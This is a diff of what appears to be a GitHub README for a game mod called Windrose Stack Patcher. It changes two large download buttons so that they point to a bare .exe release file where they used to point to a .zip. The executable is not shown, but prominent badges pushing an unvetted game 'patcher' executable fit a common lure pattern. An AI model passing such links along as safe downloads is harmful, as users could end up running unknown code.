@@ -7,7 +7,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/Solengleng/Windrose-Stack-Patcher/releases/download/Windrose-Stack-Patcher/WindroseStackPatcher.zip">
+  <a href="https://github.com/Solengleng/Windrose-Stack-Patcher/releases/download/Windrose-Stack-Patcher/WindroseStackPatcher.exe">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_Windrose_Stack_Patcher-v1.0-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Windrose Stack Patcher">
   </a>
 </p>
@@ -32,7 +32,7 @@ Stop wasting time on constant inventory management — loot more, craft faster, 
 <img width="855" height="635" alt="image" src="https://github.com/user-attachments/assets/fb6e8180-49af-4744-86dd-a65042e1b12c" />
 
 <p align="center">
-  <a href="https://github.com/Solengleng/Windrose-Stack-Patcher/releases/download/Windrose-Stack-Patcher/WindroseStackPatcher.zip">
+  <a href="https://github.com/Solengleng/Windrose-Stack-Patcher/releases/download/Windrose-Stack-Patcher/WindroseStackPatcher.exe">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_Windrose_Stack_Patcher_v1.0-2ea44f?style=for-the-badge&logo=download&logoColor=white&labelColor=2ea44f&fontSize=20" 
          alt="Download Windrose Stack Patcher v1.0" 
          width="420" 
